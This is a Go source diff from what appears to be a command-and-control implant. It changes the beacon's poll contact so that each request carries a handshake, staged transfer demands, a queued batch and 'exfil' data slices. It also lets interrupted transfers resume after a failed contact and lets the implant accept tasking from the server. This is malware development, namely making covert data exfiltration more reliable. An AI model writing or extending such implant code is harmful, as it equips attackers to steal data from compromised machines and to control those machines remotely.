@@ -56,14 +56,20 @@ func BeaconURL(enrollURL string) string {
 }
 
 // Attempt runs one poll contact: seal the request body, POST it, open the
-// response body, and hand both halves to the session. The batch leaves
-// the queue only after a processed response, so a failed contact re-sends
-// it verbatim on the next cycle.
+// response body, and hand both halves to the session. The request carries
+// the handshake first, then the staged demands at their current seams, the
+// accumulated batch, and the exfil slices the budget admits. The batch
+// leaves the queue only after a processed response, so a failed contact
+// re-sends it verbatim on the next cycle; a staged transfer's held bytes
+// survive the failure on the session, so the next demand resumes instead of
+// restarting.
 func (e *Envelope) Attempt(s *session.Session) (Attempt, error) {
 	batch := s.Batch()
+	staged := s.StagedDemands()
 	exfil := s.ExfilFrames(session.ExfilContactBudget)
-	frames := make([]*wire.Frame, 0, 1+len(batch)+len(exfil))
+	frames := make([]*wire.Frame, 0, 1+len(staged)+len(batch)+len(exfil))
 	frames = append(frames, s.HandshakeFrame())
+	frames = append(frames, staged...)
 	frames = append(frames, batch...)
 	frames = append(frames, exfil...)
 	body, contentType, err := s.EncodeOutgoing(frames)
@@ -107,6 +113,7 @@ func (e *Envelope) Attempt(s *session.Session) (Attempt, error) {
 	}
 	s.BatchCrossed()
 	s.AcceptTasking(inbound[1:])
+	s.StagedCycleEnd()
 	s.ExfilCycleEnd()
 	return Crossed, nil
 }
